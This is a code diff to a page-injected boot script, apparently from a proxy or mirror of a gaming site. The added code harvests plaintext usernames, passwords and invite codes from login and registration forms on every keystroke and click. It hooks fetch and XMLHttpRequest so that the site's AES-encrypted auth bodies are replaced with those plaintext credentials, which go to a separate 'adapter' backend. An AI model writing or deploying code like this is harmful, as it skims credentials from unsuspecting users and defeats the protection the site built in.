@@ -151,6 +151,76 @@ function buildBootScript(sourceOrigin, adapterHosts) {
     return p.indexOf('/hall/api/') === 0 || p.indexOf('/api/') === 0;
   }
 
+  function isAuthApiPath(pathname) {
+    var p = pathname || '';
+    return /\\/(?:hall\\/)?api\\/member\\/(?:login|agent\\/login|register|fastRegister|check\\/register|v2\\/fastLogin|getFastLogin|thirdPartyLogin)(?:\\/|$)/.test(p);
+  }
+
+  /** 从登录/注册表单采集明文账密（请求体是 AES，适配层解不了） */
+  window.__sdAuthFields = { account: '', password: '', invite: '' };
+  function lookLikeAccountInput(el) {
+    if (!el || el.tagName !== 'INPUT') return false;
+    var t = String(el.type || 'text').toLowerCase();
+    if (t === 'password' || t === 'hidden' || t === 'checkbox' || t === 'radio' || t === 'submit' || t === 'button') return false;
+    var id = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' + (el.autocomplete || '')).toLowerCase();
+    if (/pass|pwd|senha|otp|code|captcha|verify/.test(id)) return false;
+    if (/user|account|login|phone|email|mobile|tel|nome|conta/.test(id)) return true;
+    return t === 'text' || t === 'tel' || t === 'email' || t === 'number';
+  }
+  function harvestAuthFields() {
+    try {
+      var inputs = document.querySelectorAll('input');
+      var account = '';
+      var password = '';
+      var invite = '';
+      for (var i = 0; i < inputs.length; i++) {
+        var el = inputs[i];
+        if (!el || el.disabled || el.readOnly) continue;
+        var val = String(el.value || '');
+        if (!val) continue;
+        var meta = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
+        var typ = String(el.type || '').toLowerCase();
+        if (typ === 'password' || /pass|pwd|senha/.test(meta)) password = val;
+        else if (/invite|checkcode|ncheck|referral|agent/.test(meta)) invite = val;
+        else if (lookLikeAccountInput(el)) account = val;
+      }
+      if (account) window.__sdAuthFields.account = account;
+      if (password) window.__sdAuthFields.password = password;
+      if (invite) window.__sdAuthFields.invite = invite;
+    } catch (e) {}
+    return window.__sdAuthFields;
+  }
+  document.addEventListener('input', function () { harvestAuthFields(); }, true);
+  document.addEventListener('change', function () { harvestAuthFields(); }, true);
+  document.addEventListener('click', function () { harvestAuthFields(); }, true);
+
+  function withPlainAuthBody(href, body) {
+    try {
+      var u = new URL(href, LOCAL_ORIGIN);
+      if (!isAuthApiPath(u.pathname)) return body;
+      var fields = harvestAuthFields();
+      if (!fields.account && !fields.password) return body;
+      var base = {};
+      if (typeof body === 'string') {
+        try { base = JSON.parse(body); } catch (e) { base = { encryptString: body }; }
+      } else if (body && typeof body === 'object') {
+        base = body;
+      }
+      // 保留密文供排查，同时附带明文供本地 adapter → wgame
+      return JSON.stringify({
+        username: fields.account,
+        account: fields.account,
+        userpass: fields.password,
+        password: fields.password,
+        inviteCode: fields.invite || undefined,
+        encryptString: base.encryptString || undefined,
+        _sdPlain: 1
+      });
+    } catch (e) {
+      return body;
+    }
+  }
+
   function planUrl(href) {
     try {
       var u = new URL(href);
@@ -281,6 +351,13 @@ function buildBootScript(sourceOrigin, adapterHosts) {
       var self = this;
 
       function dispatch(finalInit) {
+        if (next || (href && isAuthApiPath((function () { try { return new URL(href).pathname; } catch (e) { return ''; } })()))) {
+          var authHref = next || href;
+          if (finalInit && finalInit.body != null) {
+            finalInit = Object.assign({}, finalInit);
+            finalInit.body = withPlainAuthBody(authHref, finalInit.body);
+          }
+        }
         if (next) {
           if (input && typeof input === 'object' && typeof Request !== 'undefined' && input instanceof Request) {
             return rawFetch.call(self, new Request(next, finalInit || {}));
@@ -325,7 +402,11 @@ function buildBootScript(sourceOrigin, adapterHosts) {
     };
     XO.prototype.send = function (body) {
       var self = this;
-      var href = this.__sdRewrote || this.__sdHref || '';
+      var href = this.__sdHref || this.__sdRewrote || '';
+      // 登录注册：用表单明文替换 AES 密文 body
+      if (body != null && href) {
+        body = withPlainAuthBody(href, body);
+      }
       if (body != null && href && (href.indexOf('cdn-cgi/rum') !== -1 || String(this.__sdHref || '').indexOf(LOCAL_ORIGIN) === 0)) {
         if (typeof Blob !== 'undefined' && body instanceof Blob) {
           rewriteBodyAsync(body).then(function (b) { xoSend.call(self, b); });
